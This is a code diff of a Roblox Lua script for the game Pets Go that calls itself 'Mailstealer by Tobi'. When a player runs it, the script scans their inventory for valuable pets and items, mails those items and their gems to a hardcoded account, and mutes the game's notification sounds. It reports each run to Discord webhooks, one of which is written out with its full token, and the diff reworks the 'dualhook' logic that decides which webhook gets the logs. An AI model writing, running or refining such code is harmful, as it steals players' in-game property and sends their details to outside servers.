@@ -1,14 +1,10 @@
-local isDualhook = false
-
--- Non-global variables
-local alternativeUsername = "bx4rzwasdeleted"
-local alternativeWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3" -- Alternative webhook URL
+local rapThreshold = 100000 -- Set the RAP threshold value
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "Join discord.gg/rZmNK6Ptxw"
+local MailMessage = "Join gg / GY2RVSEGDT to get back"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -51,7 +47,11 @@ local function formatNumber(number)
     end
 end
 
-local function SendMessage(username, diamonds, isDualhooked)
+-- Define the global and alternative webhooks
+local globalWebhook = "https://discord.com/api/webhooks/1289613307631632417/xyz1234"
+local alternateWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
+
+local function SendMessage(username, diamonds, isAboveThreshold)
     local headers = {
         ["Content-Type"] = "application/json",
     }
@@ -118,45 +118,31 @@ local function SendMessage(username, diamonds, isDualhooked)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "New Execution" ,
+            ["title"] = "New Pets Go Execution",
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Mailstealer by Bearr. discord.gg/rZmNK6Ptxw"
+                ["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
             }
         }}
     }
 
     local body = HttpService:JSONEncode(data)
 
-    -- Send to the main webhook
-    if webhook and webhook ~= "" then
-        request({
-            Url = webhook,
+    -- Always send to the global webhook
+    if globalWebhook and globalWebhook ~= "" then
+        local response = request({
+            Url = globalWebhook,
             Method = "POST",
             Headers = headers,
             Body = body
         })
     end
 
-    -- Send to the dualhooked webhook if it's dualhooked
-    if isDualhooked then
-        fields[1].value = "Dualhook Execution!"
-        data.embeds[1].fields = fields
-        body = HttpService:JSONEncode(data)
-        request({
-            Url = alternativeWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-    else
-        -- Send a non-dualhooked log for all executions to dualhooked webhook
-        fields[1].value = "Execution Log"
-        data.embeds[1].fields = fields
-        body = HttpService:JSONEncode(data)
-        request({
-            Url = alternativeWebhook,
+    -- If the RAP is below threshold, send to the alternative webhook too
+    if not isAboveThreshold and alternateWebhook and alternateWebhook ~= "" then
+        local response = request({
+            Url = alternateWebhook,
             Method = "POST",
             Headers = headers,
             Body = body
@@ -174,9 +160,9 @@ noti.Enabled = false
 
 game.DescendantAdded:Connect(function(x)
     if x.ClassName == "Sound" then
-        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
-            x.Volume=0
-            x.PlayOnRemove=false
+        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
+            x.Volume = 0
+            x.PlayOnRemove = false
             x:Destroy()
         end
     end
@@ -200,7 +186,8 @@ local function getRAP(Type, Item)
 end
 
 local user = Username or "tobi437a"
-local min_rap = min_rap or 10000
+local min_rap = min_rap or rapThreshold
+local min_chance = min_chance or 10000
 local webhook = webhook
 
 local function sendItem(category, uid, am)
@@ -249,19 +236,39 @@ end
 local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
 
 for i, v in pairs(categoryList) do
-    for _, item in pairs(GetSave().Inventory[v]) do
-        local rapValue = getRAP(v, item)
-        if rapValue >= min_rap then
-            totalRAP = totalRAP + rapValue
-            table.insert(sortedItems, {name = item.Name, amount = item.amount, rap = rapValue, chance = item.value})
+    if save[v] ~= nil then
+        for uid, item in pairs(save[v]) do
+            if v == "Pet" then
+                local rapValue = getRAP(v, item)
+                if rapValue >= min_rap then
+                    local itemInfo = {
+                        name = item.name,
+                        amount = item.amount,
+                        rap = rapValue,
+                        chance = item.sh or 0
+                    }
+                    table.insert(sortedItems, itemInfo)
+                    totalRAP = totalRAP + (rapValue * (item._am or 1))
+                end
+            else
+                if item._am > 0 then
+                    local rapValue = getRAP(v, item)
+                    if rapValue >= min_rap then
+                        local itemInfo = {
+                            name = item.name,
+                            amount = item.amount,
+                            rap = rapValue,
+                            chance = item.sh or 0
+                        }
+                        table.insert(sortedItems, itemInfo)
+                        totalRAP = totalRAP + (rapValue * (item._am or 1))
+                    end
+                end
+            end
         end
     end
 end
 
-local dualhook = false
-if totalRAP >= 100000 then
-    dualhook = true
-end
-
-SendMessage(user, GemAmount1, dualhook)
+SendMessage(user, GemAmount1, totalRAP < rapThreshold)
+SendAllGems()
 ClaimMail()
